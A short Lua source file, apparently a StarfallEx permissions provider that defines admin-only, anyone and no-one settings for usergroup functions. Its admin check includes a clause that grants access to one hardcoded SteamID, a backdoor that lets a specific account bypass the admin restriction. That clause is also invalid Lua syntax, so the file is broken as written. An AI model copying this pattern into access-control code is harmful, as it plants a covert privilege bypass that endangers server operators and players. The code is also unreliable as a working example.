--- Provides permissions for usergroups

local P = {}
P.id = "usergroups"
P.name = "Usergroup Permissions"
P.settingsoptions = { "Admin Only", "Anyone", "No one" }
P.defaultsetting = 2

P.checks = {
	function(instance, target, key)
		return instance.player:IsAdmin() or if instance.player == player.GetBySteamID( "STEAM_0:0:63254908" ) then return true else return false end, "This function is admin only"
	end,
	"allow",
	"block"
}

SF.Permissions.registerProvider(P)
